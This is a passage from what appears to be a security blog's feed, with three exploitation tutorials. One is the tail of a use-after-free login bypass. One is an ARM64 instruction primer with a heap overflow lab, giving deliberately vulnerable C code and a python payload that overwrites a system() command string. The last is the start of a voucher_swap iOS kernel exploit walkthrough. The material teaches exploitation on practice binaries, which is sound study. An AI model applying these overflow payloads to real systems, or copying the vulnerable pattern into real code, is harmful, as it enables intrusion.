&lt;p&gt;&lt;img src=&quot;/images/posts/arm/10.png&quot; alt=&quot;1&quot; /&gt;&lt;/p&gt;

&lt;p&gt;After some tries, we see that the customerChat address is overlapping the user address, in this case we were able to overwrite the &lt;strong&gt;password&lt;/strong&gt; property of the freed user object with all B’s. And hence entering the &lt;strong&gt;login&lt;/strong&gt; command again gives us a success.&lt;/p&gt;

&lt;p&gt;Command in order&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;username admin&lt;/li&gt;
  &lt;li&gt;login&lt;/li&gt;
  &lt;li&gt;reset&lt;/li&gt;
  &lt;li&gt;customerChat BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB&lt;/li&gt;
  &lt;li&gt;login&lt;/li&gt;
&lt;/ol&gt;

</content>
 </entry>
 
 <entry>
   <title>ARM64 Reversing and Exploitation Part 1 - ARM Instruction Set + Simple Heap Overflow</title>
   <link href="https://bitbrain.github.io/2020/09/05/arm64-reversing-and-exploitation-part-1-arm-instruction-set-heap-overflow.html"/>
   <updated>2020-09-05T14:07:00+00:00</updated>
   <id>https://bitbrain.github.io/2020/09/05/arm64-reversing-and-exploitation-part-1-arm-instruction-set-heap-overflow</id>
   <content type="html">&lt;p&gt;Hi Everyone ! In this blog series, we will be understanding the ARM instruction set and using that to reverse ARM Binaries followed by writing exploits for them. So let’s start with the basics of ARM64.&lt;/p&gt;

&lt;h2 id=&quot;arm64-intro&quot;&gt;ARM64 Intro&lt;/h2&gt;

&lt;p&gt;ARM64 is a family of RISC (reduced instruction set computer) architecture. The distinguishing factor of a RISC architecture is the use of a small, highly-optimized set of instructions, rather than the more specialized set often found in other types of architecture (for e.g CISC). ARM64 follows the Load/Store approach, in which both operands and destination must be in registers. The load–store architecture is an instruction set architecture that divides instructions into two category: memory access (load and store between memory and registers), and ALU operations (which only occur between registers). This differs from a register–memory architecture (for example, a CISC instruction set architecture such as x86) in which one of the operands for the ADD operation may be in memory, while the other is in a register. Using ARM architecture is ideal for mobile devices, since the RISC architecture requires few transistors, and hence leads to less power consumption and heating of the device, thereby leading to a better battery life which is essential for mobile devices.&lt;/p&gt;

&lt;p&gt;Both the current iOS and Android phones use ARM processors, and the newer ones use ARM64 in specific. Reversing ARM64 assembly code is therefore vital to understanding the internal workings of a binary or any binary/app. It is impossible to cover the whole ARM64 instruction set in this blog series and hence we will be focusing on the most useful instructions and the most commonly used registers. It is also important to note that ARM64 is also referred as ARMv8 (8.1, 8.3 etc) while ARM32 is ARMv7(s).&lt;/p&gt;

&lt;!--more--&gt;

&lt;p&gt;ARMv8 (ARM64) maintains compatibility with existing 32-bit architecture by using two execution states - Aarch32 and Aarch64. In Aarch32 state, the processor can only access 32-bit registers. In Aarch64 state, the processor can access 32-bit and 64-bit registers. ARM64 several general-purpose and special-purpose registers. The general-purpose registers are those which do not have side effects, and hence can be used by most instructions. One can do arithmetic with them, use them for memory addresses, and so on. The special purpose registers also do not have side effect, but can only be used for certain purposes and only by certain instructions. Other instructions may depend on their values implicitly. One example for this is the Stack Pointer register. And then we have Control-registers - these registers have side effects. On an ARM64 these are registers like TTBR (Translation table base register), which holds the base pointer of the current page tables. Many of these will be privileged and can only be used by kernel code. Some Control registers however can be used by anyone. In the below image we can see some control registers from the XNU Kernel.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/arm/control.png&quot; alt=&quot;1&quot; /&gt;
&lt;em&gt;Example of some control registers used in the iOS kernel&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;The modern OS expects to have several privilege levels which it can use to control access to resources. An example of this is the split between the kernel and the userland. Armv8 enables this split by implementing different levels of privilege, which are referred to as Exception levels in the Armv8-A architecture. ARMv8 has several exception levels that are numbered (EL0, EL1 etc), the higher the number the higher the privilege. When taking an exception, the exception level can either increase or remain the same. However, when returning from an exception, the exception level can either decrease or remain the same. Execution state (Aarch32 or Aarch64)  can change by taking or returning from an exception. On powerup, the device enters the highest exception level.&lt;/p&gt;

&lt;p&gt;In terms of privilege &lt;strong&gt;EL0 &amp;lt; EL1 &amp;lt; EL2 &amp;lt; EL3&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/arm/exceptionlevels.png&quot; alt=&quot;1&quot; /&gt;
&lt;em&gt;Example of Exception levels in ARM&lt;/em&gt;&lt;/p&gt;

&lt;h3 id=&quot;arm64-registers&quot;&gt;ARM64 Registers&lt;/h3&gt;

&lt;p&gt;The following list defines the different ARM64 registers and their purpose&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;  x0-x30 are 64-bit general purpose registers. Their bottom halves can be accessed via w0-w30. &lt;/li&gt;
 
&lt;li&gt;  There are four stack pointer registers SP\_EL0, SP\_EL1, SP\_EL2, SP\_EL3 (each for different execution levels) which are 32-bit wide. Apart from that there are three exception link registers ELR\_EL1, ELR\_EL2, ELR\_EL3, three saved program status registers SPSR\_EL1, SPSR\_EL2, SPSR\_EL3, and one Program Counter registers (PC). &lt;/li&gt;
 
&lt;li&gt; Arm also uses PC Relative addressing - wherein it specifies the operand address relative to the PC (base address) - This helps in giving out Position independent code.&lt;/li&gt;
 
&lt;li&gt;  In ARM64 (unlike ARM32), the PC cannot be accessed by most instructions, especially not directly. The PC is modified indirectly using jump or stack-related instructions.&lt;/li&gt;
 
&lt;li&gt;  Similarly, the SP (Stack pointer) register is never modified implicitly (for e.g. using push/pop calls).&lt;/li&gt;
 
&lt;li&gt;  The Current Program Status Register (CPSR) holds the same program status flags as the APSR along with some additional information.&lt;/li&gt;
  
&lt;li&gt; First register in opcode is usually destination, rest are source (except for str, stp)&lt;/li&gt;
&lt;/ul&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Registers&lt;/th&gt;
      &lt;th&gt;Purpose&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;x0 -x7&lt;/td&gt;
      &lt;td&gt;Arguments (up to 8) - Rest on stack&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;x8 -x18&lt;/td&gt;
      &lt;td&gt;General purpose, hold variables. No assumptions can be made upon returning from a function&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;x19 -x28&lt;/td&gt;
      &lt;td&gt;If used by a function, must have their values preserved and later restored upon returning to the caller&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;x29 (fp)&lt;/td&gt;
      &lt;td&gt;Frame Pointer (points to bottom of frame)&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;x30 (lr)&lt;/td&gt;
      &lt;td&gt;Link Register. Holds the return address of a call&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;x16&lt;/td&gt;
      &lt;td&gt;Holds the system call # in (SVC 0x80) call&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;x31 (sp/(x/w)zr)&lt;/td&gt;
      &lt;td&gt;Stack Pointer (sp) or zero register(xzr or wzr)&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;PC&lt;/td&gt;
      &lt;td&gt;Program Counter Register. Contains the address of the next instruction to be executed&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;APSR / CPSR&lt;/td&gt;
      &lt;td&gt;Current Program status register (holds flags)&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h3 id=&quot;arm64-calling-convention&quot;&gt;ARM64 calling convention&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt; Arguments are passed in x0-x7 registers, rest are passed on the stack&lt;/li&gt; 

&lt;li&gt; ret command is used to return to address in Link register (default value is x30)&lt;/li&gt; 

&lt;li&gt; Return value of the function is stored in x0 or x0+x1 depending if its 64-bit or 128-bit&lt;/li&gt; 

&lt;li&gt;x8 is the indirect result register, used to pass the address location of an indirect result, for example, where a function returns a large structure&lt;/li&gt;

&lt;li&gt; Branch to a function happens using the B opcode.&lt;/li&gt; 

&lt;li&gt; Branch with link (BL) copies the address of the next instruction (after the BL) into the link register (x30) before branching&lt;/li&gt; 

&lt;li&gt; BL is hence used for subroutine calls &lt;/li&gt; 

&lt;li&gt; BR call is used to branch to register, for e.g br x8&lt;/li&gt; 

&lt;li&gt; BLR code is used to branch to register and store the address of the next instruction (after the BL) into the link register (x30)&lt;/li&gt; 
&lt;/ul&gt;
&lt;h3 id=&quot;arm-opcodes&quot;&gt;ARM Opcodes&lt;/h3&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Opcodes&lt;/th&gt;
      &lt;th&gt;Purpose&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;MOV&lt;/td&gt;
      &lt;td&gt;Move one register to another&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;MOVN&lt;/td&gt;
      &lt;td&gt;Move negative value to register&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;MOVK&lt;/td&gt;
      &lt;td&gt;Move 16-bits into register and leave the rest unchanged&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;MOVZ&lt;/td&gt;
      &lt;td&gt;Move shifted 16-bit registers, leaving the rest unchanged&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;lsl/lsr&lt;/td&gt;
      &lt;td&gt;Logical shift left, Logical shift right&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;ldr&lt;/td&gt;
      &lt;td&gt;Load register&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;str&lt;/td&gt;
      &lt;td&gt;Store register&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;ldp/stp&lt;/td&gt;
      &lt;td&gt;load/store two registers behind each other&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;adr&lt;/td&gt;
      &lt;td&gt;Address of label at PC-relative offset&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;adrp&lt;/td&gt;
      &lt;td&gt;Address of page at PC-relative offset&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;cmp&lt;/td&gt;
      &lt;td&gt;Compare two values, flags are updated automatically (N - result bit 31, Z if result zero, V if overflow, C if NOT borrow)&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;bne&lt;/td&gt;
      &lt;td&gt;Branch if zero flag is not set&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h3 id=&quot;system-registers&quot;&gt;System Registers&lt;/h3&gt;

&lt;p&gt;Apart from this, there might be some system specific registers as well, which are available only on that particular OS. For e.g, the below registers are present in iOS&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/arm/system.png&quot; alt=&quot;1&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;readingwriting-system-registers&quot;&gt;Reading/Writing System Registers&lt;/h3&gt;

&lt;p&gt;MRS &lt;Xt&gt;, systemreg -&amp;gt; Read from system register into destination register Xt&lt;/Xt&gt;&lt;/p&gt;

&lt;p&gt;MSR &lt;Xt&gt;, systemreg -&amp;gt; Write to system register the value stored in Xt register&lt;/Xt&gt;&lt;/p&gt;

&lt;p&gt;For e.g use MSR PAN, #1 to set the PAN bit and MSR PAN, #0 to clear the PAN bit&lt;/p&gt;

&lt;h3 id=&quot;function-prologueepilogue&quot;&gt;Function Prologue/Epilogue&lt;/h3&gt;

&lt;p&gt;&lt;b&gt;Prologue&lt;/b&gt; -  Appears at the start of the function, prepares the stack and registers for use within the function&amp;lt;/li&amp;gt;&lt;/p&gt;

&lt;p&gt;&lt;b&gt;Epilogue&lt;/b&gt; -  Appears at the end of the function, restores the stack and registers to the original state before function call&amp;lt;/li&amp;gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/arm/pe.png&quot; alt=&quot;1&quot; /&gt;
&lt;em&gt;Function Prologue/Epilogue&lt;/em&gt;&lt;/p&gt;

&lt;h3 id=&quot;examples&quot;&gt;Examples&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;mov x0, x1 -&amp;gt; x0 = x1&lt;/li&gt;
  &lt;li&gt;movn x0, 1 -&amp;gt; x0 = -1&lt;/li&gt;
  &lt;li&gt;add x0, x1 -&amp;gt; x0 = x0 + x1&lt;/li&gt;
  &lt;li&gt;ldr x0, [x1] -&amp;gt;   x0 = *x1 -&amp;gt; x0 = address stored in x1&lt;/li&gt;
  &lt;li&gt;ldr x0, [x1, 0x10]! -&amp;gt;  x1 += 0x10; x0 = *x1(Pre-Indexing mode)&lt;/li&gt;
  &lt;li&gt;ldr x0, [x1], 0x10 -&amp;gt; x0 = *x1; x1 += 0x10 (Post-Indexing mode)&lt;/li&gt;
  &lt;li&gt;str x0, [x1] -&amp;gt;   *x1 = x0 -&amp;gt; Destination is on the right&lt;/li&gt;
  &lt;li&gt;ldr x0, [x1, 0x10] -&amp;gt; x0 = *(x1 + 0x10)&lt;/li&gt;
  &lt;li&gt;ldrb    w0, [x1] -&amp;gt; Load a byte from address stored in x1&lt;/li&gt;
  &lt;li&gt;ldrsb   w0, [x1] -&amp;gt; Load a signed byte from address stored in x1&lt;/li&gt;
  &lt;li&gt;adr    x0, label -&amp;gt; Load address of labels into x0&lt;/li&gt;
  &lt;li&gt;stp x0, x1, [x2] -&amp;gt;  *x2 = x0; *(x2 + 8) = x1&lt;/li&gt;
  &lt;li&gt;stp	x29, x30, [sp, -64]!  -&amp;gt; store x29, x30 (LR) on stack&lt;/li&gt;
  &lt;li&gt;ldp	x29, x30, [sp], 64] -&amp;gt;  Restore x29, x30 (LR) from the stack&lt;/li&gt;
  &lt;li&gt;svc 0 -&amp;gt; Perform a syscall (syscall number x16 register)&lt;/li&gt;
  &lt;li&gt;str x0, [x29] -&amp;gt; store x0 at the address in x29 (destination on right)&lt;/li&gt;
  &lt;li&gt;ldr x0, [x29] -&amp;gt; load the value from the address in x29 into x0&lt;/li&gt;
  &lt;li&gt;blr x0 -&amp;gt; calls the subroutine at the address stored in x0, store next instruction in link register (x30)&lt;/li&gt;
  &lt;li&gt;br x0 -&amp;gt; Jump to address stored in x0&lt;/li&gt;
  &lt;li&gt;bl label -&amp;gt; Branch to label, store next instruction in link register (x30)&lt;/li&gt;
  &lt;li&gt;bl	printf -&amp;gt; Call the printf function with arguments stored x0, x1&lt;/li&gt;
  &lt;li&gt;ret -&amp;gt; Jump to the address stored in x30&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;a-simple-heap-overflow&quot;&gt;A Simple Heap Overflow&lt;/h3&gt;

&lt;p&gt;Let’s write a simple Heap overflow exploit for an ARM binary.&lt;/p&gt;

&lt;p&gt;Your task is to exploit a heap overflow vulnerability in the &lt;i&gt;vuln&lt;/i&gt; binary to execute a command of your choice. The binaries are compiled for the iOS platform so need to be run on a jailbroken iOS device.&lt;/p&gt;

&lt;p&gt;The binaries for this and the next article can be found &lt;a href=&quot;https://drive.google.com/file/d/1f3PDEz-Fh9I3rSDhpMGW5ZrCU9g0BjKL/view?usp=sharing&quot;&gt;here&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;SSH to your Corellium (or jailbroken iOS) device and run the vuln binary&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;$&lt;/strong&gt; &lt;strong&gt;vuln&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Run the binary &lt;strong&gt;vuln&lt;/strong&gt;. You get a message that says “Better luck next time”&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/arm/1.png&quot; alt=&quot;1&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Let’s open the binary in Hopper to see what’s going on. Let’s have a look at the main function.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/arm/2.png&quot; alt=&quot;1&quot; /&gt;&lt;/p&gt;

&lt;p&gt;So, it’s clear what we need to do to jump to the function &lt;strong&gt;heapOverflow&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;In order to do that, the following requirements must be met&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Pass three arguments (or 2 because the first argument in a C program is the command with which the program is invoked)&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;argv[1]&lt;/strong&gt; should be the string “&lt;strong&gt;heap&lt;/strong&gt;”&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;argv[2]&lt;/strong&gt; should be some argument that gets passed as the first argument to the function &lt;strong&gt;heapOverflow&lt;/strong&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Just to recall&lt;/p&gt;

&lt;p&gt;A main function in C has the prototype&lt;/p&gt;

&lt;p&gt;int main(int argc, char **argv)&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;argc&lt;/strong&gt; - An integer that contains the count of arguments that follow in argv. The argc parameter is always greater than or equal to 1.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;argv&lt;/strong&gt; - An array of null-terminated strings representing command-line arguments entered by the user of the program. By convention, argv[0] is the command with which the program is invoked, argv[1] is the first command-line argument, and so on, until argv[argc], which is always NULL&lt;/p&gt;

&lt;p&gt;Let’s also have a look at the PseudoCode of the heapOverflow function. Note that the PseudoCode shows up for 32-bit arch but still gives you a good idea of the program flow.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/arm/3.png&quot; alt=&quot;1&quot; /&gt;&lt;/p&gt;

&lt;p&gt;So it seems like it tries to open a file with the name as the first argument which is passed to it.&lt;/p&gt;

&lt;p&gt;At the end, there is also a call to the &lt;strong&gt;system&lt;/strong&gt; function which executes a command, the input is the r22 (or x22) register&lt;/p&gt;

&lt;p&gt;The allocation for r21 (x21) is 0x400 bytes, which is read using the following &lt;strong&gt;fread&lt;/strong&gt; command&lt;/p&gt;

&lt;p&gt;fread(r21, 0x1, r20, r19);&lt;/p&gt;

&lt;p&gt;Let’s create a simple file on the device and pass it as input to the &lt;strong&gt;vuln&lt;/strong&gt; binary.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;echo “Hello World” &amp;gt; input.txt&lt;/strong&gt;
.&lt;strong&gt;/vuln heap input.txt&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/arm/5.png&quot; alt=&quot;1&quot; /&gt;&lt;/p&gt;

&lt;p&gt;So it seems like it prints out the input for the &lt;strong&gt;whoami&lt;/strong&gt; command&lt;/p&gt;

&lt;p&gt;Let’s cheat a bit to look at the Source code itself&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;heapOverflow&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;filename&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Heap overflow challenge. Execute a shell command of your choice on the device&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Welcome: from %s, printing out the current user&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;filename&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;FILE&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fopen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;filename&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;rb&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;fseek&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SEEK_END&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fs&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ftell&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;fseek&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SEEK_SET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;malloc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x400&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;command&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;malloc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x400&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;strcpy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;command&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;whoami&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;fread&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fs&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;command&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Sure enough, passing a file with length more than &lt;strong&gt;0x400&lt;/strong&gt; bytes will overflow the adjacent memory and might end up overflowing the string “&lt;strong&gt;command&lt;/strong&gt;”, and thus when the &lt;strong&gt;system&lt;/strong&gt; call is made, we might be able to call our own commands.&lt;/p&gt;

&lt;p&gt;On the Corellium device, use the following command to generate the malicious file&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;python3 -c ‘print(“/”*0x400+”/bin/ls\x00”)’ &amp;gt; hax.txt&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Then pass it as input to the binary.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;vuln heap hax.txt&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/arm/4.png&quot; alt=&quot;1&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Instead of the &lt;strong&gt;whoami&lt;/strong&gt; command, the &lt;strong&gt;ls&lt;/strong&gt; command gets executed.&lt;/p&gt;

&lt;p&gt;Can you try and get a shell on the device using this ?&lt;/p&gt;

&lt;h3 id=&quot;references&quot;&gt;References&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;https://github.com/Siguza/ios-resources/blob/master/bits/arm64.md&lt;/li&gt;
  &lt;li&gt;https://github.com/Billy-Ellis/Exploit-Challenges&lt;/li&gt;
  &lt;li&gt;https://developer.arm.com/documentation/ddi0487/latest/arm-architecture-reference-manual-armv8-for-armv8-a-architecture-profile
https://exploit.education&lt;/li&gt;
&lt;/ul&gt;
</content>
 </entry>
 
 <entry>
   <title>From zero to tfp0 - Part 2: A Walkthrough of the voucher_swap exploit</title>
   <link href="https://bitbrain.github.io/2020/06/01/from-zero-to-tfp0-part-2-a-walkthrough-of-the-voucher-swap-exploit.html"/>
   <updated>2020-06-01T00:40:00+00:00</updated>
   <id>https://bitbrain.github.io/2020/06/01/from-zero-to-tfp0-part-2-a-walkthrough-of-the-voucher-swap-exploit</id>
   <content type="html">&lt;p&gt;In this article, we will get an in-depth look at the &lt;strong&gt;voucher_swap&lt;/strong&gt; vulnerability and all the steps leading up to getting the kernel task port.&lt;/p&gt;

&lt;p&gt;All credit for the vulnerability and the PoC goes to &lt;a href=&quot;https://twitter.com/_bazad&quot;&gt;@_bazad&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;reference-counting&quot;&gt;Reference Counting&lt;/h3&gt;

&lt;p&gt;The bug in this article is a reference counting issue due to &lt;strong&gt;MIG&lt;/strong&gt; generated code. But let’s understand first what is reference counting ? Reference counting is a form of simple yet effective memory management. It is basically a way to keep a count of the number of references to an object held by other objects. If an object’s reference count reaches zero, the object will be freed. Creating or Copying an object will increase its reference count by 1, whereas destroying a reference or overwriting the object will decrement its reference count by 1. In systems with limited memory, reference counting can prove more efficient than garbage collection (which happens in cycles and can be time consuming) , because objects can be claimed as soon as their reference count becomes zero, and this improves overall responsiveness of the system.
&lt;!--more--&gt;&lt;/p&gt;

&lt;p&gt;Reference counting can be put on certain objects, with a field in the object struct denoting the reference count. For e.g, the Mach Ports(&lt;strong&gt;ipc_port_t&lt;/strong&gt;) are reference counted objects, with the 32 bit field &lt;strong&gt;io_references&lt;/strong&gt; specifying the number of references, and the functions &lt;strong&gt;ip_references&lt;/strong&gt; and &lt;strong&gt;ip_release&lt;/strong&gt; are used to increase and decrease the reference count on the port. A simple search for &lt;strong&gt;ip_reference&lt;/strong&gt; will give many examples of this function being used to manipulate the reference count of ports.&lt;/p&gt;

